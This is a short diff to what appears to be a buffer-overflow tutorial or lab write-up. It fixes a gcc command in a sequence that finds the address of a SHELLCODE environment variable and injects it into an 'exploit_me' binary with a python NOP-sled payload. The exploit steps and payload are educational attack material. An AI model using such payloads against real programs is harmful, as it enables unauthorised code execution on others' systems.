@@ -26,7 +26,7 @@ int main(int argc, char** argv)
 Now we retrieve the `SHELLCODE` address, convert it to little-endian and inject it in `exploit_me`.
 
 ```shell
-  $> gcc -o printAddress
+  $> gcc -o printAddress find_env_variable.c
   $> ./printAddress SHELLCODE
   env address at 0xbffff864
   $> ./exploit_me `python -c 'print("\x90"*140 + "\xbf\xff\xf8\x64"[::-1])'`
